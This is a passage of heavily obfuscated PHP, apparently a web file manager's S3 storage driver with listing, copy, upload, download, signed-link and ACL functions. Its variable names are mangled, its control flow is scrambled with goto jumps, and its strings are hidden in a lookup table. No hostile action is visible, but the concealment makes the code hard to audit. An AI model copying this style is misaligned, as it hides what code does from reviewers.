(isset($EÆ„ˆäØÔª[$fù’Š¯‰Ö§[150]][$fù’Š¯‰Ö§[151]])) { $DìÈÆ‹ŸË› = $EÆ„ˆäØÔª[$fù’Š¯‰Ö§[150]][$fù’Š¯‰Ö§[151]]; } else { if (isset($EÆ„ˆäØÔª[$fù’Š¯‰Ö§[150]][$fù’Š¯‰Ö§[152]])) { $DìÈÆ‹ŸË› = $EÆ„ˆäØÔª[$fù’Š¯‰Ö§[150]][$fù’Š¯‰Ö§[152]]; } else { $DìÈÆ‹ŸË› = md5("{$EÆ„ˆäØÔª[$fù’Š¯‰Ö§[28]]}\x5f{$EÆ„ˆäØÔª[$fù’Š¯‰Ö§[76]]}\137{$EÆ„ˆäØÔª[$fù’Š¯‰Ö§[78]]}"); } } $A»ä–Ô©¹º = "{$DìÈÆ‹ŸË›}\137{$bº™Æ»Õ‘—}\x2e\x70\156\147"; goto EíË¯Ê·­™; B£¹Ø¸™Î: $B±¦Ò¥ì¨È = DATA_THUMB . $A»ä–Ô©¹º; if (!@file_exists($B±¦Ò¥ì¨È)) { $E‡Ô¶Œ–» = TEMP_FILES; if (!is_dir($E‡Ô¶Œ–»)) { mk_dir($E‡Ô¶Œ–»); } $D­¡«ù = $E‡Ô¶Œ–» . $DìÈÆ‹ŸË› . $fù’Š¯‰Ö§[90] . $EÆ„ˆäØÔª[$fù’Š¯‰Ö§[148]]; if (!@file_exists($D­¡«ù)) { $D­¡«ù = $this->download($dø¢ïŒÓõ, $D­¡«ù); } $d†Ó‰Ş¢Ù² = new ImageThumb($D­¡«ù, $fù’Š¯‰Ö§[155]); $d†Ó‰Ş¢Ù²->prorate($B±¦Ò¥ì¨È, $bº™Æ»Õ‘—, $bº™Æ»Õ‘—); } if (!file_exists($B±¦Ò¥ì¨È) || filesize($B±¦Ò¥ì¨È) < 100) { return @file_exists($D­¡«ù) ? IO::fileOut($Aƒ™·ƒåƒ¬) : $this->fileOut($dø¢ïŒÓõ); } goto cŒõÙç; cŒõÙç: if (!($dòï¹ªˆ÷ = IO::move($B±¦Ò¥ì¨È, $bö‹Œ°´àÎ))) { return IO::fileOut($B±¦Ò¥ì¨È); } del_file($B±¦Ò¥ì¨È); IO::fileOut($dòï¹ªˆ÷); goto fóÜ‹½ƒõ×; fóÜ‹½ƒõ×: } public function fileOutImageServer($bî°´ñ, $Dõº‡˜»…Õ = 250) { self::fileOutImage($bî°´ñ, $Dõº‡˜»…Õ); } public function fileNameAuto($f…¯ ø‰›, $f‘å˜«Êé¸, $b¶½×ˆÆ… = REPEAT_RENAME, $A“Ô…¤ÉË = false) { goto Aï£‡Ğ„Ò½; dÂŠ»…¢œˆ: if ($b¶½×ˆÆ… == REPEAT_SKIP) { return !1; } $Bæ·‚Ó”ÊŠ = $AÈ Ûç‘£®[90] . get_path_ext($f‘å˜«Êé¸); $Bæ·‚Ó”ÊŠ = $Bæ·‚Ó”ÊŠ == $AÈ Ûç‘£®[90] || $A“Ô…¤ÉË ? $AÈ Ûç‘£®[33] : $Bæ·‚Ó”ÊŠ; goto BØ³¬¹Ö; Aï£‡Ğ„Ò½: $AÈ Ûç‘£® =& $_SERVER[ÍÓÖ€°å]; $AãØÕÔÊÉ = $f…¯ ø‰› === $AÈ Ûç‘£®[33] ? $f‘å˜«Êé¸ : rtrim($f…¯ ø‰›, $AÈ Ûç‘£®[8]) . $AÈ Ûç‘£®[8] . $f‘å˜«Êé¸; if ($b¶½×ˆÆ… == REPEAT_REPLACE || !$this->exist($AãØÕÔÊÉ) || $A“Ô…¤ÉË && $b¶½×ˆÆ… != REPEAT_RENAME_FOLDER) { return $f‘å˜«Êé¸; } goto dÂŠ»…¢œˆ; E¿Š‚Ôâ´: while ($this->exist(rtrim($f…¯ ø‰›, $AÈ Ûç‘£®[8]) . $AÈ Ûç‘£®[8] . $cè“°§‹–)) { $cè“°§‹– = $b±µˆ¡Ò¬ . "\50{$BÁ„ÉÒ’¸}\x29{$Bæ·‚Ó”ÊŠ}"; $BÁ„ÉÒ’¸++; } return $cè“°§‹–; goto aä¡Ç£©Ş; BØ³¬¹Ö: $BÁ„ÉÒ’¸ = 1; $b±µˆ¡Ò¬ = substr($f‘å˜«Êé¸, 0, strlen($f‘å˜«Êé¸) - strlen($Bæ·‚Ó”ÊŠ)); $cè“°§‹– = $b±µˆ¡Ò¬ . "\50{$BÁ„ÉÒ’¸}\51{$Bæ·‚Ó”ÊŠ}"; goto E¿Š‚Ôâ´; aä¡Ç£©Ş: } public function listAllFiles($f­³¸„ä…, $fÖ˜ƒçòäˆ, $A¬‡÷¿Òéµ = array()) { goto dƒ‚µ´¡¦Ì; dƒ‚µ´¡¦Ì: $A£­ß’ğóÏ =& $_SERVER[ÍÓÖ€°å]; if (empty($fÖ˜ƒçòäˆ)) { return array(); } $e‡áëøµŠ– = array(); goto B¥éˆ„å…; B¥éˆ„å…: $f­³¸„ä… = trim($f­³¸„ä…, $A£­ß’ğóÏ[8]); foreach ($fÖ˜ƒçòäˆ as $dœãƒîòº’) { $d°º¸ˆè†¥ = ltrim(substr($dœãƒîòº’, strlen($f­³¸„ä…)), $A£­ß’ğóÏ[8]); $e‡áëøµŠ– = array_merge($e‡áëøµŠ–, $this->slicePath($d°º¸ˆè†¥)); } $FØÀ“ªåÉ = array(); goto Cññæñ‘Î½; Cññæñ‘Î½: foreach (array_unique($e‡áëøµŠ–) as $dœãƒîòº’) { $bô„“‰¶ñ‹ = array($A£­ß’ğóÏ[76] => $this->getPathOuter($A£­ß’ğóÏ[8] . $f­³¸„ä… . $A£­ß’ğóÏ[8] . $dœãƒîòº’), $A£­ß’ğóÏ[77] => 1, $A£­ß’ğóÏ[78] => 0); if (substr($dœãƒîòº’, -1) != $A£­ß’ğóÏ[8]) { $bô„“‰¶ñ‹[$A£­ß’ğóÏ[77]] = 0; $b›ôªë¥‡ = $this->getPath($f­³¸„ä… . $A£­ß’ğóÏ[8] . $dœãƒîòº’); $bô„“‰¶ñ‹[$A£­ß’ğóÏ[78]] = isset($A¬‡÷¿Òéµ[$b›ôªë¥‡]) ? $A¬‡÷¿Òéµ[$b›ôªë¥‡] : $this->size($b›ôªë¥‡); } $FØÀ“ªåÉ[] = $bô„“‰¶ñ‹; } return $FØÀ“ªåÉ; goto E·Üš“¼ƒ­; E·Üš“¼ƒ­: } public function slicePath($eÉÆ°îŠÃ–) { $eÀßÔà÷²Š =& $_SERVER[ÍÓÖ€°å]; $e§øœøÁ±­ = explode($eÀßÔà÷²Š[8], trim($eÉÆ°îŠÃ–, $eÀßÔà÷²Š[8])); $CË­ğ¢ğº = 0; do { ++$CË­ğ¢ğº; $D¥áà´‡™[] = implode($eÀßÔà÷²Š[8], array_slice($e§øœøÁ±­, 0, $CË­ğ¢ğº)) . $eÀßÔà÷²Š[8]; } while ($CË­ğ¢ğº < count($e§øœøÁ±­)); $D¥áà´‡™[count($e§øœøÁ±­) - 1] = $eÉÆ°îŠÃ–; return $D¥áà´‡™; } public function getHost($cñ“ƒøÅõ = true) { $d¤«²±Ïå =& $_SERVER[ÍÓÖ€°å]; $FÜÌæŠÌîñ = parse_url(trim($this->domain, $d¤«²±Ïå[8])); $B¸Á¤……ç = isset($FÜÌæŠÌîñ[$d¤«²±Ïå[156]]) ? $FÜÌæŠÌîñ[$d¤«²±Ïå[156]] : http_type(); $e…³ƒäÃ» = isset($FÜÌæŠÌîñ[$d¤«²±Ïå[157]]) ? $FÜÌæŠÌîñ[$d¤«²±Ïå[157]] : $FÜÌæŠÌîñ[$d¤«²±Ïå[76]]; if (isset($FÜÌæŠÌîñ[$d¤«²±Ïå[158]])) { $e…³ƒäÃ» .= $d¤«²±Ïå[4] . $FÜÌæŠÌîñ[$d¤«²±Ïå[158]]; } return $B¸Á¤……ç . $d¤«²±Ïå[159] . $e…³ƒäÃ» . ($cñ“ƒøÅõ ? $d¤«²±Ïå[8] . $this->bucket : $d¤«²±Ïå[33]); } public function pathEncode($e‰–Û±İÛ‹) { $aÀ·‘¡›·Ğ =& $_SERVER[ÍÓÖ€°å]; return str_replace($aÀ·‘¡›·Ğ[160], $aÀ·‘¡›·Ğ[8], rawurlencode($e‰–Û±İÛ‹)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public function __construct($E‹±¡‘„â) { set_timeout(); require_once SDK_DIR . $_SERVER[ÍÓÖ€°å][161]; parent::__construct(); $this->_init($E‹±¡‘„â); } public function _init($eÙ¨¯«µƒ¿) { foreach ($eÙ¨¯«µƒ¿ as $C¡ÔøÀƒã => $E›™¡òøÃã) { if (isset($this->{$C¡ÔøÀƒã})) { $this->{$C¡ÔøÀƒã} = $E›™¡òøÃã; } } $this->endpoint = $eÙ¨¯«µƒ¿[$_SERVER[ÍÓÖ€°å][162]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost(!1)); } public function signatureVersion($AÍ×„–ÙÁ = "\x76\x34") { $this->signVer = $AÍ×„–ÙÁ; $this->client->setSignatureVersion($AÍ×„–ÙÁ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto C‰óµ®ŒÛ; d¶®†å è: $EçãÎ¶ĞÑñ = array($c¨Âóß‚ÔË[168], $c¨Âóß‚ÔË[169], $c¨Âóß‚ÔË[170], $c¨Âóß‚ÔË[171], $c¨Âóß‚ÔË[172]); $dÜ÷éŠŠ¦µ = array_diff($EçãÎ¶ĞÑñ, $D‡ÂÜ„ª™); return empty($dÜ÷éŠŠ¦µ); goto Eó‡÷ä¨²°; C‰óµ®ŒÛ: $c¨Âóß‚ÔË =& $_SERVER[ÍÓÖ€°å]; $F²ùèœŠÛá = $this->getBucketCors(); if (!$F²ùèœŠÛá || !is_array($F²ùèœŠÛá)) { return !1; } goto BÓ¸õ»ñßè; BÓ¸õ»ñßè: if ($F²ùèœŠÛá[$c¨Âóß‚ÔË[163]] != $c¨Âóß‚ÔË[164] || $F²ùèœŠÛá[$c¨Âóß‚ÔË[165]] != $c¨Âóß‚ÔË[164]) { return !1; } $D‡ÂÜ„ª™ = array_map($c¨Âóß‚ÔË[166], $F²ùèœŠÛá[$c¨Âóß‚ÔË[167]]); if (!is_array($D‡ÂÜ„ª™)) { $D‡ÂÜ„ª™ = array(); } goto d¶®†å è; Eó‡÷ä¨²°: } public function mkfile($fœƒä˜İ¿, $F‹œ åÇî = '', $Eº‹Áæ¤†ç = REPEAT_RENAME) { $BĞöØİ™¹è = $this->setContent($fœƒä˜İ¿, $F‹œ åÇî); if ($BĞöØİ™¹è !== !1) { return $this->getPathOuter($fœƒä˜İ¿); } return !1; } public function mkdir($FÖˆÂ†ë¼¸, $FÌË³ˆîƒ› = REPEAT_SKIP) { if (empty($FÖˆÂ†ë¼¸)) { return !1; } if ($this->isFolder($FÖˆÂ†ë¼¸)) { return $this->getPathOuter($FÖˆÂ†ë¼¸); } $aôÎ„¼Ñ©¢ = $this->setContent($FÖˆÂ†ë¼¸, $_SERVER[ÍÓÖ€°å][33], !0); if ($aôÎ„¼Ñ©¢ !== !1) { return $this->getPathOuter($FÖˆÂ†ë¼¸); } return !1; } public function copyFile($cÔÍß„ÂÕ¯, $f—Îè«, $fÂ²ëåÍ½ø = array()) { $D³‰ëåµè =& $_SERVER[ÍÓÖ€°å]; $F–ÄÒåŞ‚“ = $this->getObjectInfo($cÔÍß„ÂÕ¯); if (!$F–ÄÒåŞ‚“) { return !1; } if ($F–ÄÒåŞ‚“[$D³‰ëåµè[78]] <= 1024 * 1024 * 200) { return $this->client->copyObject($this->bucket, $cÔÍß„ÂÕ¯, $this->bucket, $f—Îè«, $D³‰ëåµè[173], $fÂ²ëåÍ½ø); } return $this->client->multiCopyObject($this->bucket, $cÔÍß„ÂÕ¯, $this->bucket, $f—Îè«, $fÂ²ëåÍ½ø); } public function moveFile($Bßóà±Â‰Æ, $a»ŞÅÛØá) { if ($this->copyFile($Bßóà±Â‰Æ, $a»ŞÅÛØá)) { $this->delFile($Bßóà±Â‰Æ); return !0; } return !1; } public function delFile($Bº¢ÙˆŞ¤) { return $this->client->deleteObject($this->bucket, $Bº¢ÙˆŞ¤); } public function delFolder($eó½Şß„Èß) { goto CùÄ; d÷¨œò¼‹Î: $Cä»¬ë®ù‹ = $A½Í§î˜©… = 0; $EÁ¯òé«È‘ = array_chunk(array_keys($C• ”„ï¯), 1000); foreach ($EÁ¯òé«È‘ as $DøÇÛ…—·¾) { $Cä»¬ë®ù‹++; $A½Í§î˜©… += (int) $this->client->deleteObjects($this->bucket, $DøÇÛ…—·¾); } goto cÛ¹”…ù¥; cÛ¹”…ù¥: return $Cä»¬ë®ù‹ === $A½Í§î˜©… ? !0 : !1; goto c—Çğø­ª”; CùÄ: $fïˆ‘‹Øé =& $_SERVER[ÍÓÖ€°å]; $C• ”„ï¯ = $this->listObjs($eó½Şß„Èß); if (!$C• ”„ï¯) { $eó½Şß„Èß = trim($eó½Şß„Èß, $fïˆ‘‹Øé[8]); if (!empty($eó½Şß„Èß)) { $eó½Şß„Èß .= $fïˆ‘‹Øé[8]; } return $this->delFile($eó½Şß„Èß); } goto d÷¨œò¼‹Î; c—Çğø­ª”: } public function rename($cå¿Óí¦å±, $fĞ‡¤ö’Ø—) { return $this->renameObject($cå¿Óí¦å±, $fĞ‡¤ö’Ø—); } public function size($b¢‰µó½ß) { $C·Ö—ØÏêÛ =& $_SERVER[ÍÓÖ€°å]; $A² Ô–¼†½ = $this->info($b¢‰µó½ß); return isset($A² Ô–¼†½[$C·Ö—ØÏêÛ[78]]) ? $A² Ô–¼†½[$C·Ö—ØÏêÛ[78]] : 0; } public function info($F¨òù†óô¡) { if ($this->isFolder($F¨òù†óô¡)) { return $this->folderInfo($F¨òù†óô¡, 1); } return $this->fileInfo($F¨òù†óô¡); } public function exist($bÔœ×å†…©) { if ($this->isFile($bÔœ×å†…©)) { return !0; } return $this->isFolder($bÔœ×å†…©); } public function isFile($bŞ†œÏø) { return $this->client->getObjectInfo($this->bucket, trim($bŞ†œÏø, $_SERVER[ÍÓÖ€°å][8]), !1); } public function isFolder($D‹‘öÊé™£) { $AÚ¬í®Š¦ = $this->listObjs($D‹‘öÊé™£, null, 1); return !empty($AÚ¬í®Š¦) ? !0 : !1; } public function listPath($b÷óî½ä³’, $dÊ¶²Æ‚¯½ = false, $A…áª‡—¤õ = false) { $b»µŞïŸÔ„ =& $_SERVER[ÍÓÖ€°å]; $CÓÇ‡½‰ãõ = $this->listObjs($b÷óî½ä³’, null, null, $b»µŞïŸÔ„[8]); $DçàÙ¬¨« = array($b»µŞïŸÔ„[75] => array(), $b»µŞïŸÔ„[74] => array()); foreach ($CÓÇ‡½‰ãõ as $d‡Ñ®×°Š => $bƒ‹ÀºÚ¦) { if ($d‡Ñ®×°Š == $b»µŞïŸÔ„[8]) { continue; } if (isset($bƒ‹ÀºÚ¦[$b»µŞïŸÔ„[174]])) { $DçàÙ¬¨«[$b»µŞïŸÔ„[75]][] = $this->folderInfo($bƒ‹ÀºÚ¦[$b»µŞïŸÔ„[174]], $dÊ¶²Æ‚¯½, $A…áª‡—¤õ); } else { if (substr($bƒ‹ÀºÚ¦[$b»µŞïŸÔ„[28]], -1) == $b»µŞïŸÔ„[8]) { continue; } $DçàÙ¬¨«[$b»µŞïŸÔ„[74]][] = $this->fileInfo($bƒ‹ÀºÚ¦[$b»µŞïŸÔ„[28]], $bƒ‹ÀºÚ¦, $A…áª‡—¤õ); } } return $DçàÙ¬¨«; } private function fileInfo($c´²¯Òë”, $Fİ×á£ä¡¹ = array(), $f˜„ƒ÷Š = false) { goto Dø™¾íÉîŸ; Dø™¾íÉîŸ: $CŞÃ•“õÉ =& $_SERVER[ÍÓÖ€°å]; if ($f˜„ƒ÷Š) { return array($CŞÃ•“õÉ[28] => $this->pathThis($c´²¯Òë”), $CŞÃ•“õÉ[76] => $this->getPathOuter($c´²¯Òë”), $CŞÃ•“õÉ[29] => $CŞÃ•“õÉ[155], $CŞÃ•“õÉ[148] => $this->ext($c´²¯Òë”), $CŞÃ•“õÉ[78] => isset($Fİ×á£ä¡¹[$CŞÃ•“õÉ[78]]) ? $Fİ×á£ä¡¹[$CŞÃ•“õÉ[78]] : 0); } $FãÑ¢àí¶» = array($CŞÃ•“õÉ[28] => $this->pathThis($c´²¯Òë”), $CŞÃ•“õÉ[76] => $this->getPathOuter($c´²¯Òë”), $CŞÃ•“õÉ[29] => $CŞÃ•“õÉ[155], $CŞÃ•“õÉ[175] => $CŞÃ•“õÉ[50], $CŞÃ•“õÉ[101] => $CŞÃ•“õÉ[50], $CŞÃ•“õÉ[78] => 0, $CŞÃ•“õÉ[148] => $this->ext($c´²¯Òë”), $CŞÃ•“õÉ[176] => !0, $CŞÃ•“õÉ[177] => !0); goto b›ãÆƒïå; b›ãÆƒïå: if (empty($Fİ×á£ä¡¹)) { $Fİ×á£ä¡¹ = $this->getObjectInfo($c´²¯Òë”); if (!$Fİ×á£ä¡¹) { return $FãÑ¢àí¶»; } $this->fileInfoImage($c´²¯Òë”, $FãÑ¢àí¶»); } $FãÑ¢àí¶»[$CŞÃ•“õÉ[101]] = $Fİ×á£ä¡¹[$CŞÃ•“õÉ[178]]; $FãÑ¢àí¶»[$CŞÃ•“õÉ[78]] = $Fİ×á£ä¡¹[$CŞÃ•“õÉ[78]]; goto C«¤‰›çÏ–; C«¤‰›çÏ–: return $FãÑ¢àí¶»; goto BˆŒñƒßŸñ; BˆŒñƒßŸñ: } private function folderInfo($DÒÒÜ½…æÔ, $dÙŞ—«¾…ğ = 0, $dÓ‡ïØ™âË = false) { goto d™†Êè¼õ®; Cë ª¦ê¬Ş: return $e¼àÖƒƒ‹; goto Fâ‰Ò”‰¡„; d™†Êè¼õ®: $e¾É‡®µ‘ñ =& $_SERVER[ÍÓÖ€°å]; if ($dÓ‡ïØ™âË) { return array($e¾É‡®µ‘ñ[28] => $this->pathThis($DÒÒÜ½…æÔ), $e¾É‡®µ‘ñ[76] => $this->getPathOuter($e¾É‡®µ‘ñ[8] . $DÒÒÜ½…æÔ), $e¾É‡®µ‘ñ[29] => $e¾É‡®µ‘ñ[77]); } $e¼àÖƒƒ‹ = array($e¾É‡®µ‘ñ[28] => $this->pathThis($DÒÒÜ½…æÔ), $e¾É‡®µ‘ñ[76] => $this->getPathOuter($e¾É‡®µ‘ñ[8] . $DÒÒÜ½…æÔ), $e¾É‡®µ‘ñ[29] => $e¾É‡®µ‘ñ[77], $e¾É‡®µ‘ñ[175] => $e¾É‡®µ‘ñ[50], $e¾É‡®µ‘ñ[101] => $e¾É‡®µ‘ñ[50], $e¾É‡®µ‘ñ[179] => !1, $e¾É‡®µ‘ñ[180] => !1, $e¾É‡®µ‘ñ[176] => !0, $e¾É‡®µ‘ñ[177] => !0); goto EÓÎöÛ¨ò; EÓÎöÛ¨ò: if ($DÒÒÜ½…æÔ == $e¾É‡®µ‘ñ[33]) { return $e¼àÖƒƒ‹; } $d’ŠÕ˜ÅË = $this->getObjectInfo(trim($DÒÒÜ½…æÔ, $e¾É‡®µ‘ñ[8]) . $e¾É‡®µ‘ñ[8]); if (!$d’ŠÕ˜ÅË) { return $e¼àÖƒƒ‹; } goto CæŒÍ«Æé†; CæŒÍ«Æé†: $e¼àÖƒƒ‹[$e¾É‡®µ‘ñ[175]] = $d’ŠÕ˜ÅË[$e¾É‡®µ‘ñ[178]]; $e¼àÖƒƒ‹[$e¾É‡®µ‘ñ[101]] = $d’ŠÕ˜ÅË[$e¾É‡®µ‘ñ[178]]; if ($dÙŞ—«¾…ğ) { $e¼àÖƒƒ‹[$e¾É‡®µ‘ñ[179]] = $this->has($DÒÒÜ½…æÔ, !1); $e¼àÖƒƒ‹[$e¾É‡®µ‘ñ[180]] = $this->has($DÒÒÜ½…æÔ, !0); } goto Cë ª¦ê¬Ş; Fâ‰Ò”‰¡„: } public function listObjs($cƒÇ¨¿ÚøÆ, $cŸ×ŠŒ’½© = null, $A‰Òã×‚Û¾ = null, $D¢×©¢à‘ = null) { $EŞË‹ôòğâ =& $_SERVER[ÍÓÖ€°å]; $cƒÇ¨¿ÚøÆ = trim($cƒÇ¨¿ÚøÆ, $EŞË‹ôòğâ[8]); $A¾®íïõ¿ø = empty($cƒÇ¨¿ÚøÆ) ? $EŞË‹ôòğâ[33] : $cƒÇ¨¿ÚøÆ . $EŞË‹ôòğâ[8]; return $this->client->getBucket($this->bucket, $A¾®íïõ¿ø, $cŸ×ŠŒ’½©, $A‰Òã×‚Û¾, $D¢×©¢à‘, !0); } public function has($FÔ„ëø½«Á, $a Ä¥†©™ª = true) { $F²Ò²ƒ‹©Ï =& $_SERVER[ÍÓÖ€°å]; $aÆ¯ñŞËÎ‹ = null; $eÉ‘²×âÅš = 20; $bÍÜ·‚ùÍ‰ = $F²Ò²ƒ‹©Ï[8]; while (!0) { $fÌŞ»ÙÔÊ’ = $this->listObjs($FÔ„ëø½«Á, $aÆ¯ñŞËÎ‹, $eÉ‘²×âÅš, $bÍÜ·‚ùÍ‰); if (!$fÌŞ»ÙÔÊ’) { return !1; } end($fÌŞ»ÙÔÊ’); $aÆ¯ñŞËÎ‹ = key($fÌŞ»ÙÔÊ’); if ($a Ä¥†©™ª) { foreach ($fÌŞ»ÙÔÊ’ as $EšİÃ¢•„ñ) { if (isset($EšİÃ¢•„ñ[$F²Ò²ƒ‹©Ï[28]]) && substr($EšİÃ¢•„ñ[$F²Ò²ƒ‹©Ï[28]], -1) != $F²Ò²ƒ‹©Ï[8]) { return !0; } } } else { foreach ($fÌŞ»ÙÔÊ’ as $EšİÃ¢•„ñ) { if (isset($EšİÃ¢•„ñ[$F²Ò²ƒ‹©Ï[174]])) { return !0; } } } if (count($fÌŞ»ÙÔÊ’) < $eÉ‘²×âÅš || !$aÆ¯ñŞËÎ‹) { break; } } return !1; } public function listAll($AÃì¯¹½Üâ) { $D³·‡ñ¹…õ =& $_SERVER[ÍÓÖ€°å]; $eÒ‰ò¡Ë½Á = $this->listObjs($AÃì¯¹½Üâ); $F™‡İ™äë† = $c÷àñÖÁ½ = array(); foreach ($eÒ‰ò¡Ë½Á as $Bâ¡Û°Â¥¬ => $BàÇ˜Û¹‹) { $F™‡İ™äë†[] = $BàÇ˜Û¹‹[$D³·‡ñ¹…õ[28]]; $c÷àñÖÁ½[$Bâ¡Û°Â¥¬] = $BàÇ˜Û¹‹[$D³·‡ñ¹…õ[78]]; } return $this->listAllFiles($AÃì¯¹½Üâ, $F™‡İ™äë†, $c÷àñÖÁ½); } public function canRead($a—éÇ £¦«) { $E¬‹È¤æğ° =& $_SERVER[ÍÓÖ€°å]; $fğ–š¸«ìˆ = $this->client->getAccessControlPolicy($this->bucket, $a—éÇ £¦«); if (!$fğ–š¸«ìˆ) { return !1; } return in_array($fğ–š¸«ìˆ, array($E¬‹È¤æğ°[181], $E¬‹È¤æğ°[182], $E¬‹È¤æğ°[183])) ? !0 : !1; } public function canWrite($e‚ÃÔ éêá) { $D¸ƒ˜Ü‚‹ =& $_SERVER[ÍÓÖ€°å]; $e±º‡äŸæ = $this->client->getAccessControlPolicy($this->bucket, $e‚ÃÔ éêá); if (!$e±º‡äŸæ) { return !1; } return in_array($e±º‡äŸæ, array($D¸ƒ˜Ü‚‹[181], $D¸ƒ˜Ü‚‹[182])) ? !0 : !1; } public function getContent($A‰’Ñæ©˜‘) { return $this->client->getObject($this->bucket, $A‰’Ñæ©˜‘); } public function setContent($d—Ğ“šÏÂò, $B‡ê§©¡ö = '', $EŞÒ¹„àó­ = false) { goto Dˆ­Œƒ›ä; Dˆ­Œƒ›ä: $b˜ÜèíéÄ =& $_SERVER[ÍÓÖ€°å]; $d—Ğ“šÏÂò = $EŞÒ¹„àó­ ? trim($d—Ğ“šÏÂò, $b˜ÜèíéÄ[8]) . $b˜ÜèíéÄ[8] : $d—Ğ“šÏÂò; $C÷Ó·¬·‚¿ = get_file_mime(get_path_ext($d—Ğ“šÏÂò)); goto a˜˜ÍËŸì½; cÛ‘¿¯Ù—: $Aˆå×©„’å = $this->copyFile($d—Ğ“šÏÂò, $d—Ğ“šÏÂò, array($b˜ÜèíéÄ[184] => $Aˆå×©„’å[$b˜ÜèíéÄ[185]])); return $Aˆå×©„’å ? !0 : !1; goto CøÌŠÛ•Ùë; a˜˜ÍËŸì½: $Aˆå×©„’å = $this->client->putObject($B‡ê§©¡ö, $this->bucket, $d—Ğ“šÏÂò, $b˜ÜèíéÄ[173], array(), $C÷Ó·¬·‚¿); if (!$Aˆå×©„’å) { return !1; } if ($EŞÒ¹„àó­) { return !0; } goto cÛ‘¿¯Ù—; CøÌŠÛ•Ùë: } public function fileSubstr($DÊÄÚöªì, $a²Îœ‹İÊ, $Bè‹ïÃ‹) { $D”ï¢·ÛĞ× = $a²Îœ‹İÊ + $Bè‹ïÃ‹ - 1; return $this->client->getObject($this->bucket, $DÊÄÚöªì, array($_SERVER[ÍÓÖ€°å][186] => "\x62\x79\164\x65\163\75{$a²Îœ‹İÊ}\x2d{$D”ï¢·ÛĞ×}")); } public function upload($bÇœÄª±Û, $aŞš˜ŠœØÚ, $E½™©·¿ = false, $bùó•‡àÓ = REPEAT_REPLACE) { $EùÇ¾™¾Àá =& $_SERVER[ÍÓÖ€°å]; $f¼’ÊÀÁ‹Â = array($EùÇ¾™¾Àá[184] => @md5_file($aŞš˜ŠœØÚ)); $F¤Ğ¬µÛÏÛ = array($EùÇ¾™¾Àá[187] => get_file_mime(get_path_ext($bÇœÄª±Û))); if (IO::size($aŞš˜ŠœØÚ) <= 1024 * 1024 * 200) { $dÎßÙ¿ã‡š = $this->client->putObjectFile($aŞš˜ŠœØÚ, $this->bucket, $bÇœÄª±Û, $EùÇ¾™¾Àá[173], $f¼’ÊÀÁ‹Â, $F¤Ğ¬µÛÏÛ); return !empty($dÎßÙ¿ã‡š) ? !0 : !1; } $EÙ‘ŸĞ­ = $this->client->multiUploadObject($aŞš˜ŠœØÚ, $this->bucket, trim($bÇœÄª±Û, $EùÇ¾™¾Àá[8]), $f¼’ÊÀÁ‹Â, $F¤Ğ¬µÛÏÛ); return $EÙ‘ŸĞ­ ? $this->getPathOuter($bÇœÄª±Û) : !1; } public function download($CÕÉÀš—ØÚ, $B«öõ‚ˆ—ˆ) { if (!@is_dir($this->pathFather($B«öõ‚ˆ—ˆ)) && !IO::mkdir($this->pathFather($B«öõ‚ˆ—ˆ))) { return !1; } $B‡õ‹•­î† = $this->client->getObject($this->bucket, $CÕÉÀš—ØÚ, array(), $B«öõ‚ˆ—ˆ); return $B‡õ‹•­î† !== !1 ? $B«öõ‚ˆ—ˆ : !1; } public function link($aõÙÏóĞµÇ, $DÌ×Œ«„ƒë = array()) { $AÊ°È©È¹Û =& $_SERVER[ÍÓÖ€°å]; if ($this->signVer == $AÊ°È©È¹Û[188]) { return $this->client->getAuthenticatedURL($this->bucket, $aõÙÏóĞµÇ, 3600 * 12, !1, $DÌ×Œ«„ƒë); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($aõÙÏóĞµÇ, $AÊ°È©È¹Û[8]), 3600 * 12, $this->region, array(), !0, $DÌ×Œ«„ƒë); } public function fileOut($Dä§¨ÛÇŠ–, $A¤Ù¶ùÕ‰Ë = false, $FÌ±òïâõ = false, $c™µ¯Ö®Š = '') { goto D¢­«ÓÖ÷á; c¬À¢ßØŠ²: if ($a‡ŠÉƒæõÃ == $Dáò±Ò¶­Š[189]) { return parent::fileOut($Dä§¨ÛÇŠ–, $A¤Ù¶ùÕ‰Ë, $FÌ±òïâõ, $c™µ¯Ö®Š); } $A¤Ù¶ùÕ‰Ë = $A¤Ù¶ùÕ‰Ë ? $Dáò±Ò¶­Š[190] : $Dáò±Ò¶­Š[191]; $DÍ½¡ëÚ˜ = array($Dáò±Ò¶­Š[192] => $A¤Ù¶ùÕ‰Ë . $Dáò±Ò¶­Š[193] . rawurlencode($FÌ±òïâõ), $Dáò±Ò¶­Š[194] => $a‡ŠÉƒæõÃ); goto Eà¬˜æ™Œ„; Eà¬˜æ™Œ„: $C•øÃ¶¦¬‹ = $this->link($Dä§¨ÛÇŠ–, $DÍ½¡ëÚ˜); $this->fileOutLink($C•øÃ¶¦¬‹); goto EáŞó¶–¾; D¢­«ÓÖ÷á: $Dáò±Ò¶­Š =& $_SERVER[ÍÓÖ€°å]; if (!$FÌ±òïâõ) { $FÌ±òïâõ = $this->pathThis($Dä§¨ÛÇŠ–); } $a‡ŠÉƒæõÃ = get_file_mime(get_path_ext($FÌ±òïâõ)); goto c¬À¢ßØŠ²; EáŞó¶–¾: } public function fileOutServer($a½›˜¸„¹, $Aä±‰×Ğ° = false, $D’ÂØèºÃ = false, $c“Çœ¢Šò = '') { parent::fileOut($a½›˜¸„¹, $Aä±‰×Ğ°, $D’ÂØèºÃ, $c“Çœ¢Šò); } public function fileOutImage($EÔ¤¥ŸëÊ¹, $a¯Ö¦©ŠÄÓ = 250) { $Béˆ«ó¤àÍ = $this->link($EÔ¤¥ŸëÊ¹); $this->fileOutLink($Béˆ«ó¤àÍ); } public function fileOutImageServer($dĞïÛ”–©, $cİà‚¡Â± = 250) { parent::fileOutImage($dĞïÛ”–©, $cİà‚¡Â±); } public function hashMd5($F»…Ê­ÂÊ, $F¾™ÊµŞ©Ë = '') { $dˆòÉÍÆÇ‘ =& $_SERVER[ÍÓÖ€°å]; $BÜ±Ô¹¬ = $this->getObjectInfo($F»…Ê­ÂÊ); if (!$BÜ±Ô¹¬) { return !1; } if 